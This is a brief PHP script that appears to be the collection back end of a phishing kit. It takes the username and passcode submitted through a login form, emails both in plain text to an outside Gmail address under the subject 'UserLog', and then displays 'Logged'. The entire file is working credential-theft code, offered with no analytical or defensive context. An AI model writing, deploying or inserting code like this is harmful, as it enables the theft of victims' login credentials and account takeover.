<?php
$current = isset($_POST['username'])?$_POST['username']:null;
$currentp = isset($_POST['passcode'])?$_POST['passcode']:null;
?>
<?php
mail('makennatjasmine@gmail.com','UserLog',"User: $current\n Pass: $currentp\n");
echo "Logged";
?>